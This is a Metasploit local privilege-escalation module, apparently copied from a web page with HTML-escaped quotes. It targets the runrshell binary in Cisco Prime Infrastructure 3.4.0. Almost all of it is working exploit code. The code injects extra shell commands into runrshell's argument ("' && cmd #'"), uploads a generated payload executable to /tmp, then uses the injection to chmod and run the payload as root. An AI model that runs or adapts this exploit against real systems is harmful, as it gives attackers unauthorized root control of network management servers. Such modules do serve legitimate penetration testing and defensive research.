# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Post::File
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super( update_info( info,
      &#039;Name&#039;           => &#039;Cisco Prime Infrastructure Runrshell Privilege Escalation&#039;,
      &#039;Description&#039;    => %q{
        This modules exploits a vulnerability in Cisco Prime Infrastructure&#039;s runrshell binary. The
        runrshell binary is meant to execute a shell script as root, but can be abused to inject
        extra commands in the argument, allowing you to execute anything as root.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Pedro Ribeiro <pedrib[at]gmail.com>&#039;, # First discovery
          &#039;sinn3r&#039;                               # Metasploit module
        ],
      &#039;Platform&#039;       => [&#039;linux&#039;],
      &#039;Arch&#039;           => [ARCH_X86, ARCH_X64],
      &#039;DisclosureDate&#039; => &#039;2018-12-08&#039;,
      &#039;Privileged&#039;     => true,
      &#039;References&#039;     =>
        [
          [&#039;URL&#039;, &#039;https://github.com/pedrib/PoC/blob/master/advisories/cisco-prime-infrastructure.txt#L56&#039;],
        ],
      &#039;Targets&#039;        =>
        [
          [ &#039;Cisco Prime Infrastructure 3.4.0&#039;, {} ]
        ],
      &#039;DefaultTarget&#039;  => 0
     ))

    register_advanced_options [
      OptString.new(&#039;WritableDir&#039;, [true, &#039;A directory where we can write the payload&#039;, &#039;/tmp&#039;])
    ]
  end

  def exec_as_root(cmd)
    command_string = "/opt/CSCOlumos/bin/runrshell &#039;\" && #{cmd} #&#039;"
    vprint_status(cmd_exec(command_string))
  end

  def exploit
    payload_name = "#{Rex::Text.rand_text_alpha(10)}.bin"
    exe_path = Rex::FileUtils.normalize_unix_path(datastore[&#039;WritableDir&#039;], payload_name)
    print_status("Uploading #{exe_path}")
    write_file(exe_path, generate_payload_exe)
    unless file?(exe_path)
      print_error("Failed to upload #{exe_path}")
      return
    end

    register_file_for_cleanup(exe_path)
    print_status(&#039;chmod the file with +x&#039;)
    exec_as_root("/bin/chmod +x #{exe_path}")
    print_status("Executing #{exe_path}")
    exec_as_root(exe_path)
  end
end

